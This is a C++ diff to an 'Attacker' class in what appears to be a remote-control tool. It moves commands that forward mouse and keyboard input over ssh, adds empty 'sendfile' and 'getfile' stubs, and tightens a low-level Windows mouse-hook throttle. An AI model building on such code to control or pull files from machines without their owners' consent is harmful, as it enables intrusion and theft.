@@ -334,26 +334,6 @@ bool Attacker::handleCmd(const std::string& s)
 		else
 			tui.clearServerShell();
 	}
-	else if (cmd == "togglemouse") {
-		if (param.size() != 0)
-			tui.printServerShell("incorrect number of arguments entered\n");
-		else if (isSshActive) {
-			isSendingMouse = !isSendingMouse;
-			tui.setIsSendingMouse(isSendingMouse);
-		}
-		else
-			tui.printServerShell("ssh must be active\n");
-	}
-	else if (cmd == "togglekeyboard") {
-		if (param.size() != 0)
-			tui.printServerShell("incorrect number of arguments entered\n");
-		else if (isSshActive) {
-			isSendingKeyboard = !isSendingKeyboard;
-			tui.setIsSendingKeyboard(isSendingKeyboard);
-		}
-		else
-			tui.printServerShell("ssh must be active\n");
-	}
 	
 	//with server confirm
 	else if ((cmd == "connect") || (cmd == "adminconnect")) {
@@ -566,6 +546,45 @@ bool Attacker::handleCmd(const std::string& s)
 		else
 			tui.printServerShell("unknown error\n");
 	}
+	
+	else if (cmd == "togglemouse") {
+		if (param.size() != 0)
+			tui.printServerShell("incorrect number of arguments entered\n");
+		else if (!isSshActive)
+			tui.printServerShell("ssh must be active\n");
+		else {
+			isSendingMouse = !isSendingMouse;
+			tui.setIsSendingMouse(isSendingMouse);
+		}
+	}
+	else if (cmd == "togglekeyboard") {
+		if (param.size() != 0)
+			tui.printServerShell("incorrect number of arguments entered\n");
+		else if (!isSshActive)
+			tui.printServerShell("ssh must be active\n");
+		else {
+			isSendingKeyboard = !isSendingKeyboard;
+			tui.setIsSendingKeyboard(isSendingKeyboard);
+		}
+	}
+	else if (cmd == "sendfile") {
+		if (param.size() != 2)
+			tui.printServerShell("incorrect number of arguments entered\n");
+		else if (!isSshActive)
+			tui.printServerShell("ssh must be active\n");
+		else {
+
+		}
+	}
+	else if (cmd == "getfile") {
+		if (param.size() != 2)
+			tui.printServerShell("incorrect number of arguments entered\n");
+		else if (!isSshActive)
+			tui.printServerShell("ssh must be active\n");
+		else {
+
+		}
+	}
 	else
 		tui.printServerShell("command entered is not valid\n");
 
@@ -706,7 +725,7 @@ LRESULT CALLBACK Attacker::LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lP
 			break;
 		}
 		case WM_MOUSEMOVE: {
-			if (attacker->mouseTimer.getElapsedTime().asMilliseconds() < 80)
+			if (attacker->mouseTimer.getElapsedTime().asMilliseconds() < 65)
 				break;
 
 			auto size = sf::Vector2f(sf::VideoMode::getDesktopMode().size);
